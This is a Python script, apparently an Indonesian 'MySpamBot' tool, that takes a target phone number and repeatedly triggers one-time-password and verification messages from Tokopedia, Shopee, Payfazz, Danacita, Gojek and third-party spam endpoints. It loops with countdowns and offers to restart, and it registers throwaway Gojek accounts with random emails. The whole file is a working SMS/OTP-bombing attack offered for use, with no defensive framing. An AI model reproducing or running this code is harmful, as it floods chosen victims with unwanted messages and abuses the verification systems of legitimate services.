import sys
import subprocess
import requests
import time
import random
import os
import urllib3
import json
import re
import socket
from bs4 import BeautifulSoup as bs
from urllib3.exceptions import *

# Inisialisasi warna
hijau = "\033[1;92m"
putih = "\033[1;97m"
abu = "\033[1;90m"
kuning = "\033[1;93m"
ungu = "\033[1;95m"
merah = "\033[1;91m"
biru = "\033[1;96m"

# Setup DNS resolver yang lebih baik
def custom_dns_resolver(host):
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return None

# Function untuk print dengan efek ketik
def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.050)

# Function countdown
def countdown(time_sec):
    while time_sec:
        mins, secs = divmod(time_sec, 60)
        timeformat = f'\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{mins:02d}:{secs:02d}'
        waktu = time.localtime()
        keterangan_jam = time.strftime("%H:%M:%S", waktu)
        keterangan_tanggal = time.strftime("%d", waktu)
        keterangan_bulan = time.strftime("%B", waktu)
        
        bulan_bulan = {
            "January": 'Januari', "February": "Februari", "March": "Maret",
            "April": "April", "May": "Mei", "June": "Juni",
            "July": "Juli", "August": "Agustus", "September": "September",
            "October": "Oktober", "November": "November", "December": "Desember"
        }
        
        bulan = bulan_bulan.get(keterangan_bulan, keterangan_bulan)
        keterangan_tahun = time.strftime("%Y", waktu)
        keterangan_hari = time.strftime("%A", waktu)
        
        hari_hari = {
            "Sunday": 'Minggu', "Monday": "Senin", "Tuesday": "Selasa",
            "Wednesday": "Rabu", "Thursday": "Kamis", "Friday": "Jum'at", "Saturday": "Sabtu"
        }
        
        hari = hari_hari.get(keterangan_hari, keterangan_hari)
        
        print(f"{timeformat} | {biru}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {kuning}Waktu {keterangan_jam}", end='\r')
        time.sleep(1)
        time_sec -= 1

def tanya(nomor):
    check_input = 0
    while check_input == 0:
        a = input(f"{merah}Apakah Anda ingin mengulangi Spam Tools? y/t\n{putih}Input Anda: {hijau}")
        if a.lower() == "y":
            check_input = 1
            start(nomor, 1)
        elif a.lower() == "t":
            check_input = 1
            autoketik(f"{hijau}Berhasil Keluar Dari Tools")
            sys.exit()
        else:
            print("Masukkan Pilihan Dengan Benar")

def safe_request(session, method, url, **kwargs):
    try:
        # Tambahkan timeout secara otomatis jika tidak disediakan
        if 'timeout' not in kwargs:
            kwargs['timeout'] = 15
            
        response = session.request(method, url, **kwargs)
        return response
    except Exception as e:
        autoketik(f"{merah}Error pada {url}: {str(e)}")
        return None

def jam(nomor):
    autoketik("Program Berjalan!")
    b = nomor[1:12]  # Contoh: nomor = 89508226367
    c = "62" + b     # Contoh: nomor = 6289508226367
    
    with requests.Session() as session:
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive',
        })
        
        for _ in range(10):
            # Tokopedia
            try:
                token_page = safe_request(session, 'get', f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{nomor}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D')
                if token_page:
                    token = re.search(r'<input id="Token" value="(.*?)" type="hidden">', token_page.text)
                    if token:
                        token = token.group(1)
                        safe_request(session, 'post', 'https://accounts.tokopedia.com/otp/c/ajax/request-wa', data={
                            "otp_type": "116",
                            "msisdn": nomor,
                            "tk": token,
                            "email": '',
                            "original_param": "",
                            "user_id": "",
                            "signature": "",
                            "number_otp_digit": "6"
                        })
            except Exception as e:
                autoketik(f"{merah}Error Tokopedia: {str(e)}")
            
            # Shopee
            try:
                safe_request(session, 'post', "https://shopee.co.id/api/v4/otp/send_vcode", json={
                    "phone": c,
                    "force_channel": True,
                    "operation": 7,
                    "channel": 2,
                    "supported_channels": [1, 2, 3]
                }, headers={
                    "X-Csrftoken": "I8eSRy1l27NAL6ES8c9l05vVmpJMp8wd",
                    "Referer": "https://shopee.co.id/buyer/login/otp"
                })
            except Exception as e:
                autoketik(f"{merah}Error Shopee: {str(e)}")
            
            # Alodoc
            try:
                safe_request(session, 'post', "https://nuubi.herokuapp.com/api/spam/alodok", data={"number": nomor})
            except Exception as e:
                autoketik(f"{merah}Error Alodoc: {str(e)}")
            
            # Klikdok
            try:
                safe_request(session, 'post', "https://nuubi.herokuapp.com/api/spam/klikdok", data={'number': nomor})
            except Exception as e:
                autoketik(f"{merah}Error Klikdok: {str(e)}")
            
            # Payfazz
            try:
                safe_request(session, 'post', "https://api.payfazz.com/v2/phoneVerifications", data={"phone": "0" + nomor})
            except Exception as e:
                autoketik(f"{merah}Error Payfazz: {str(e)}")
            
            # Danacita
            try:
                safe_request(session, 'get', f"https://api.danacita.co.id/users/send_otp/?mobile_phone={nomor}")
            except Exception as e:
                autoketik(f"{merah}Error Danacita: {str(e)}")
            
            # Gojek
            try:
                safe_request(session, 'post', "https://api.gojekapi.com/v5/customers", json={
                    "email": f"{random.randint(100000,999999)}@gmail.com",
                    "name": f"User{random.randint(1000,9999)}",
                    "phone": c,
                    "signed_up_country": "ID"
                }, headers={"X-AppId": "com.gojek.app"})
            except Exception as e:
                autoketik(f"{merah}Error Gojek: {str(e)}")
            
            autoketik(f"{hijau}Sukses Mengirim Spam Iterasi {_+1}/10")
            countdown(120)
        
    tanya(nomor)

def start(nomor, x):
    if x == 0:
        os.system("cls")
        autoketik(f"{merah}Infinite Loop Spam to {putih}{nomor} {merah}is {hijau}Ready!{hijau}")
        jam(nomor)
    else:
        print("")
        autoketik("--reboot wait 20 second--")
        time.sleep(20)
        os.system("cls")
        autoketik(f"{merah}Mengulang Spam ke Nomor : {nomor}.....{hijau}")
        jam(nomor)

def main():
    os.system("cls")
    autoketik(f"Selamat datang di {merah}MySpamBot")
    print(f"""{kuning}Author      : {hijau}Ricky Khairul Faza
{kuning}Github      : {merah}github.com/rickyfazaa
{kuning}Instagram   : {biru}instagram.com/rickyfazaa""")
    
    nomor = input(f"{hijau}Masukkan Nomor Target: {putih}")
    if not nomor.startswith('0') or len(nomor) < 10:
        autoketik(f"{merah}Format nomor tidak valid! Harus dimulai dengan 0 dan minimal 10 digit")
        return
        
    start(nomor, 0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        autoketik(f"{merah}\nBatal\n{hijau}--Keluar Dari Tools--")
        sys.exit()